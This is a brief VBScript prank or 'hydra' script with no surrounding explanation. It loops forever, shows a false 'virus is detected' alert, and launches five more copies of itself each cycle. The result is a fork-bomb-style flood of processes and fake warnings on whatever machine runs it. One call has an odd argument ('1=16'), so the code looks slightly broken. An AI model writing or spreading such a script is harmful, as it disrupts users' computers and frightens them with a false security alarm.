do
X=MsgBox("virus is detected", 1=16,"Alert")
Set x=WScript.CreateObject("WScript.Shell")
for i = 1 to 5
x.Run"hydra.vbs"
wscript.sleep 500
next
loop